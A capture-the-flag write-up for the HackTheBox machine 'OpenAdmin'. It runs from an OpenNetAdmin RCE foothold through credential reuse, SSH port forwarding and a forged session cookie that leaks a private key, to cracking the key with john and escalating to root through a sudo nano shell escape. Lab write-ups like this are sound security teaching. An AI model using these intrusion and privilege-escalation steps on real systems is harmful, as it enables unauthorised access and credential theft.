# openadmin

**general info**

IP: _10.10.10.171_

hostname: `openadmin.htb`

port scanning for all services, all ports:
 - exposed ports: `80`, `22`
 - 'internal' ports running unknown services: `53`, `52846`
     
gobuster -> dir footholds:
  - `/music` (login redirects to -> `/ona`)
  - `/images`

---

## getting in

identify openadmin vulnerability on password submission [`oan-rce.sh`] that gets you a low-priv, static shell (limited to `ld` and `cat` commands) as the user `www-data` and enumerate through files from that limited perspective.

in this stage we find a few really crucial things:

1. `ls -lah $HOME/` identifies two users: `joanna` and `jimmy`
2. `www-data` is, indeed, very low-privilege and cannot write to any important config files, though we _can_ upload files directly to the `/var/www/data` directory
3. there is a `.gitignore` file in `/opt/ona/.gitignore` from our working directory that indicates with few exceptions the `www/local` directory is excluded, which means we ought to carefully comb through what's in the content of those directories
  - a recursive `grep` for `passwd` leads us to `www/local/config/database_settings_inc.php` where there's plaintext creds for the user, jimmy, for accessing the `mysql` db
  - using that password, we may as well see if we can `ssh` in as jimmy (`ssh jimmy@10.10.10.171` ) - lucky for us we can!

```
## /www/local/config/database_settings_inc.php

<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => '************',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

---

## jimmy

running a `find / -name user.txt` showed that the flag for this box wouldn't be under this user - we do see, however, there's a permission denied error returned off of the `/home/joanna/` directory, meaning taking over joanna's account is our goal.

enumerating through the dotfiles doesn't yield much more info for for what we can do, but it does yield something we should definitely remember later:

```
cat /etc/sudoers.d/joanna

joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
```

_interesting..._

anyway, remember that mystery service running on port `52846` from before? maybe it's an internal service that's running - given this is an admin challenge, that wouldn't be such a crazy thought.

another `ls -lah /var/www/`, but this time as jimmy, we see an `/internal` directory with a `main.php` file. 

```
## /var/www/internal/main.php

<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

ok, well this is _definitely_ something - what does it tell us? 

a) jimmy and joanna are not doing a very good job

b) the word ninja may be a password or at least part of a password

c) if the requst header is coming from `/index.php` and a `$_SESSION['username']` is set, joanna's _private key_ (`/home/joanna/.ssh/id_rsa` will be printed out for us. oof.

### getting the private rsa key

there's an `index.php` file that gives us more insight into how we can manipulate this:

```
## /var/www/internal/index.php

<h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
```

what are the takeaways here?

a) jimmy and joanna are not going to have a good time explaning this

b) the username sent to `main.php` is _hardcoded_ to only accept `jimmy`. we can see that `$_SESSION['username'] = 'jimmy'` is the subsequent operation to that validation check - in `php` that's a [superglobal](https://www.php.net/manual/en/language.variables.superglobals.php) - meaning it's available in all scopes. where is this being used? in `session_start` which, per the php docs:

> session_start() creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie.

it appears manipulating the 'session identifier' is going to be our route, as opposed to manipulating the 'cookie' given how `index.php` and `main.php` are written around the `$_SESSION['username']` value.

### how about a reverse proxy?

to get a closer look, we can't just visit this page in our browser given  the site is internal and thus only available locally on the host `opeadmin.htb` machine. _but_, since we have `ssh` access (thx jimmy), we can create a reverse proxy and port forward `localhost:52846` to an exposed port on our end. 

i'm running my environment in `docker`, but the following ought to apply independent of your environment. i personally had `4444` exposed and verified it wasn't already in use on the host.

`ssh -L 4444:localhost:52846 jimmy@10.10.10.171` then log in using the password we already collected for him earlier.

i then visited `http://localhost:4444/index.php` and got a drab login page - voilà, this is just what we wanted. to get better insight into what was happening in this request, i toggled between my local proxies for `docker` and `burp` to intercept it after logging in as jimmy with whatever password, it doesn't matter because we're just trying to see how it works.

the captured request showed some interesting info, notably:

```
Captured Request
POST /index.php HTTP/1.1
Host: 127.0.0.1:4444
Origin: http://127.0.0.1:4444
Referer: http://127.0.0.1:4444/
Cookie: PHPSESSID=kfjfalsjfmdmemamsdga
username=jimmy&password=whatev%21&login=
```

recall what stood out in `index.php`: 

```
$_SESSION['username'] = 'jimmy';
header("Location: /main.php");
```

...meaning, the request we want to make to expose that private key is going to be going to `/main.php` and the Cookie value is where we'll implement our knowledge of jimmy being the hardcoded `$_SESSION['username']` and replace the generated ID string with his name.

i ended up just running this as a curl request on the host as jimmy: 

```
curl -v -i -s -k -X $'GET' \
    -H $'Host: localhost:52846' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=jimmy' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=jimmy' \
    $'http://localhost:52846/main.php'
```

the response to `stdout` was the rsa key for joanna. nice. 

<small>_note_: you could skip the reverse proxy stuff altogether, but it was helpful for me to see the full request and get a more visual representation of what properties the endpoint was configured to expect.</small>

### cracking the rsa private key

after saving the private key locally, say `id_rsa`, change the file permissions to be read/write only for us (`chmod 600`) then try `ssh`'ing into the machine as joanna

`ssh -i id_rsa joanna@10.10.10.171`

we're prompted for a passphrase if you can believe it! so we need to walk it back a little, and see whether we can decrypt the key and then feed it into a program like `johntheripper` to extract the passphrase. 

first, we need to convert the key format:

```
python ssh2john.py id_rsa > cracked_key
```

now, we can feed `cracked_key` to `john` to enumerate through a bunch of possible passphrases for a match:

```
john cracked_key --wordlist=$HOME/wordlists/rockyou.txt
```
<small>*note*: your rockyou.txt can be wherever</small>

the password ***** is returned, so we know that's joanna's passphrase and we can use that to decrypt the private key using `openssl`

```
openssl rsa -in id_rsa -out cracked_key
password: <enter our password cracked by john>
```

now, let's try logging in again:

```
ssh -i cracked_key joanna@10.10.10.171
```

*great success!*

---

## joanna

we can quickly locate our `user.txt` file, but now we want to see how, as joanna, we can root the box.

remember that `/etc/sudoers.d/joann` file from earlier? trust, but verify by running `sudo -l` which outputs all that we can run as `root`.

sure enough, we have `sudo` privs when running `nano` 


earlier recon showed that joanna had unique `sudo` priveleges when it came to `nano` - so let's verify that with `sudo -l` to output all that she can run as root...

---

## root

as joanna:

```
sudo /bin/nano /opt/priv
```

but now what? what can we do as root in _nano_ - a lot it turns out. you can execute commands in nano, meaning we've got a _de facto_ shell.

```
^R^X ## read file, then enter command
reset; sh 1>&0 2>&0
```

`sh 1>&0 2>&0` essentially turns the nano command input into a bash command line - run `whoami` and see `root` output to the editor itself - from there it's pretty straightforward to find the `root.txt` file.